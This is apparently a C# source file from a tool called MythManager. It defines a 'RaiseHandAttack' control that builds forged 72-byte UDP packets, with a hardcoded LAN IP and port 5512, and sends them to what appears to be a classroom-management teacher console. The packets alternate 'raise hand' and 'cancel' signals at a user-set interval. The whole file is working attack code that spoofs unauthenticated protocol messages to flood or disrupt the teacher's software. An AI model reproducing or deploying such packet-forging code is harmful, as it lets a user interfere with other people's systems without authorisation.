﻿using System;
using System.Collections.Generic;
using System.Windows.Controls;

namespace MythManager.Pages.UDPAttack.AttackFunctions.TeacherAttack
{
    /// <summary>
    /// RaiseHandAttack.xaml 的交互逻辑
    /// </summary>
    public partial class RaiseHandAttack : UserControl, IAttackFunction
    {
        public RaiseHandAttack()
        {
            InitializeComponent();
        }

        public string Nickname => "举手";
        public AttackPacket ConstructPacket(ref string message)
        {
            byte[] packetRaise = new byte[72]
            {
                    0x41, 0x4e, 0x4e, 0x4f, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Raise Hand (Index 18) */0x10, 0x00, 0xc0, 0xa8, 0x89, 0x81,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            byte[] packetCancel = new byte[72];
            Array.Copy(packetRaise, packetCancel, packetRaise.Length);
            packetCancel[18] = 0x00; // Cancel Hand Raise (Index 18)
            return new AttackPacket(new List<byte[]> { packetRaise, packetCancel }, 5512, (int)RaiseHandInterval.Value);
        }
    }
}
